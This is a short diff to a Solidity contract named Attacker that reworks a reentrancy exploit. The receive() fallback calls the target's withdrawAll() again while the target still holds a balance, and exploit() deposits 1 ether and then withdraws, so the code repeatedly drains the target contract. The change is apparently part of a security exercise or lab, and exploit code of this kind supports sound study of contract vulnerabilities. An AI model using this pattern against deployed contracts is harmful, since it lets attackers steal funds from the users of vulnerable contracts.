@@ -21,16 +21,13 @@ contract Attacker {
 
     receive() external payable {
         if (address(target).balance > 0) {
-            exploit();
+            target.withdrawAll();
         }
     }
 
     function exploit() public payable {
-        //First time deposit funds
-        if (!firstTimeDeposit) {
-            firstTimeDeposit = true;
-            target.deposit{value: 1 ether}();
-        }
+        //Deposit funds
+        target.deposit{value: 1 ether}();
 
         target.withdrawAll();
     }
